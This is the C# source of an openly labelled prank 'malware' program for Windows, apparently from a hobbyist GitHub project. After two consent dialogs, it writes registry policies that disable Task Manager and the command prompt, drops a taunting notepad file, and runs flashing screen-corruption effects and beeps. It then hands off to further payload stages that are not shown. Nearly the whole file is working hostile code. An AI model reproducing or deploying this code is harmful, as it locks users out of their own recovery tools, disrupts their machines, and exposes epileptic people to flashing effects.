using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;
/* 
        This project was made by S-illy
           https://github.com/S-illy
      Also you can support me with a donation
           https://ko-fi.com/silly69
You can modify this source as you give me credits :D
 
*/
namespace winchancho // it was a hell creating this btw T_T
{
    public partial class Payload : Form
    {
        // Import stuff
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hwnd);

        [DllImport("gdi32.dll")]

        // c++!!
        private static extern int BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height,
                                         IntPtr hdcSrc, int xSrc, int ySrc, int rop);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int width, int height);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]

        // creating timers & effects
        private static extern bool DeleteObject(IntPtr hObject);

        private const int SRCCOPY = 0x00CC0020;
        private const int NOTSRCCOPY = 0x00330008;
        private const uint SRCAND = 0x008800C6;
        private const uint SRCPAINT = 0x00EE0086;
        private const uint SRCINVERT = 0x00660046;

        private IntPtr desktopDC;
        private Thread effectThread;
        private bool effectsRunning = true;

        private System.Threading.Timer timer;
        public Payload()
        {
            InitializeComponent();
            desktopDC = GetWindowDC(GetDesktopWindow());
            timer = new System.Threading.Timer(SillyOtherPayload, null, Timeout.Infinite, Timeout.Infinite);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Payload3 caca = new Payload3();
            caca.Show();
            DialogResult result1 = MessageBox.Show(
                "What you just opened is a malware. It's going to mess with your system, display annoying visual effects, and lock your computer.\n\nPlease, if you intend to open this program, be careful if you are an epileptic person. If you did not know about the malicious purpose of this program, please cancel now. Otherwise, continue.",
                "winchancho.exe",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning
            ); if (result1 == DialogResult.No)
            {
                Application.Exit();
                return;
            }

            DialogResult result2 = MessageBox.Show("Pretty generic, right?\n\nIf you click yes, your computer will be FUCKED\nThe creator of this malware is not responsible for any damage done to your machine. Please use it responsibly. Thanks.\n\nTHIS PROGRAM SHOULD NOT BE SHARED WITH ANYONE.", "winchancho.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (result2 == DialogResult.No)
            {
                Application.Exit();
                return;
            }
            // Disable
            SillyTASKMGR();
            SillyCMD();
            string sex = "Enjoy the final moments with your computer, it was still wrong of you to want to destroy it, don't you think about his family? Don't you think about his components (children)?\n\nAnyway it was your decision\n\n\nYou could try to play something in the meantime, couldn't you?";

            // Tempfile for the notepad :D
            string loc = Path.Combine(Path.GetTempPath(), "fucked_by_silly.txt");
            File.WriteAllText(loc, sex);

            Process.Start("notepad.exe", loc);

            // start the party
            effectThread = new Thread(SillyEffects);
            effectThread.IsBackground = true;
            effectThread.Start();
            // Moving to second payload
            timer.Change(28000, Timeout.Infinite);
            // Beeps
            SillyBeep();
        }

        static void SillyTASKMGR()
        {
            const string keyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
            const string valueName = "DisableTaskMgr";

            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    if (key != null)
                    {
                        key.SetValue(valueName, 1, RegistryValueKind.DWord); 
                    }
                    else
                    {
                        MessageBox.Show("No se pudo acceder a la clave del registro.");
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}");
            }
        }

        static void SillyCMD()
        {
            const string keyPath = @"Software\Policies\Microsoft\Windows\System";
            const string valueName = "DisableCMD";

            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    if (key != null)
                    {
                        key.SetValue(valueName, 2, RegistryValueKind.DWord); 
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"{ex.Message}");
            }
        }

            private void SillyOtherPayload(object state)
        {
            // Moving to the next payload
            effectsRunning = false;
            this.Invoke(new Action(() => {
                effectThread.Abort();
                this.Hide();
                Payload2 boo = new Payload2();
                boo.Show();
            }));
        }

        private void SillyBeep()
        {
            while (effectsRunning)
            {
                int t = (int)(DateTime.Now.Ticks / TimeSpan.TicksPerMillisecond) & 0xFFFF;
                int soundValue = 43 * ((t >> 6) | t | (t > 6 ? 1 : 0)) + 4 * ((t & (t >> 3)) | (t >> 5));
                byte sound = (byte)(soundValue & 255);
                int frequency = 200 + (sound * 2000 / 200); // Freq (2000 max / 200 min)
                Console.Beep(frequency, 100);
            }
        }

        private void SillyEffects()
        {
            Random random = new Random();
            while (effectsRunning)
            {
                // effects
                SillyRotate(random);
                SillyLoop(random);
                SillyInvert();
                SillyGlitchIThink(random);
                ChileMomento(random);
                SillyDistort(random);
                BananaSplit(random);
            }
        }

        /*      
 ⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀ ⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿   Magic effects
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟ 
         */

        private void SillyLoop(Random random) // Screen loop
        {
            int loopWidth = Screen.PrimaryScreen.Bounds.Width / 4;
            int loopHeight = Screen.PrimaryScreen.Bounds.Height / 4;

            IntPtr loopDC = CreateCompatibleDC(desktopDC);
            IntPtr loopBitmap = CreateCompatibleBitmap(desktopDC, loopWidth, loopHeight);
            IntPtr oldBitmap = SelectObject(loopDC, loopBitmap);

            BitBlt(loopDC, 0, 0, loopWidth, loopHeight, desktopDC, random.Next(0, Screen.PrimaryScreen.Bounds.Width), random.Next(0, Screen.PrimaryScreen.Bounds.Height), SRCCOPY);

            for (int i = 0; i < 50; i++)
            {
                BitBlt(desktopDC, random.Next(0, Screen.PrimaryScreen.Bounds.Width), random.Next(0, Screen.PrimaryScreen.Bounds.Height), loopWidth, loopHeight, loopDC, 0, 0, SRCCOPY);
            }
        }

        private void SillyInvert() // Invert screen color
        {
            BitBlt(desktopDC, 0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height,
                   desktopDC, 0, 0, NOTSRCCOPY);
        }

        private void SillyGlitchIThink(Random random) // Glitchs
        {
            for (int i = 0; i < 15; i++)
            {
                int x = random.Next(Screen.PrimaryScreen.Bounds.Width);
                int y = random.Next(Screen.PrimaryScreen.Bounds.Height);
                int width = random.Next(50, 150);
                int height = random.Next(50, 150);

                BitBlt(desktopDC, x, y, width, height, desktopDC, x + random.Next(-100, 100), y + random.Next(-100, 100), SRCCOPY);
            }
        }

        private void ChileMomento(Random random) // Shake
        {
            int shakeDistance = 10;
            for (int i = 0; i < 5; i++)
            {
                int xOffset = random.Next(-shakeDistance, shakeDistance);
                int yOffset = random.Next(-shakeDistance, shakeDistance);
                BitBlt(desktopDC, xOffset, yOffset, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height,
                       desktopDC, 0, 0, SRCCOPY);
            }
        }

        private void SillyDistort(Random random) // Glitching screen with a wave (left or right idk)
        {
            for (int x = 0; x < Screen.PrimaryScreen.Bounds.Width; x += 50)
            {
                int offset = random.Next(-20, 20);
                BitBlt(desktopDC, (int)(x + offset), 0, 50, Screen.PrimaryScreen.Bounds.Height, desktopDC, (int)x, 0, (int)SRCAND);
            }
        }

        private void SillyRotate(Random random) // YIPEE
        {
            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;

            // context
            IntPtr memoryDC = CreateCompatibleDC(desktopDC);
            IntPtr bitmap = CreateCompatibleBitmap(desktopDC, width, height);
            IntPtr oldBitmap = SelectObject(memoryDC, bitmap);

            // copy the screen
            BitBlt(memoryDC, 0, 0, width, height, desktopDC, 0, 0, SRCCOPY);

            // Rotate!11
            for (int angle = 0; angle < 360; angle += 10)
            {
                int offsetX = (int)(width / 2.0 - width / 2.0 * Math.Cos(angle * Math.PI / 180.0));
                int offsetY = (int)(height / 2.0 - height / 2.0 * Math.Sin(angle * Math.PI / 180.0));

                BitBlt(desktopDC, offsetX, offsetY, width, height, memoryDC, 0, 0, SRCCOPY);
                Thread.Sleep(1);
            }

         //   SelectObject(memoryDC, oldBitmap);
         //   DeleteObject(bitmap);
         //   DeleteDC(memoryDC);
        }

        private void BananaSplit(Random random)
        {
            int width = Screen.PrimaryScreen.Bounds.Width / 5;
            int height = Screen.PrimaryScreen.Bounds.Height / 5;

            for (int i = 0; i < 10; i++)
            {
                int x = random.Next(0, Screen.PrimaryScreen.Bounds.Width - width);
                int y = random.Next(0, Screen.PrimaryScreen.Bounds.Height - height);
                int xOffset = random.Next(-100, 100);
                int yOffset = random.Next(-100, 100);

                BitBlt(desktopDC, x + xOffset, y + yOffset, width, height, desktopDC, x, y, SRCCOPY);
            }
        }

        // Por si las moscas jiji

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            effectThread?.Abort();
        }
    }
}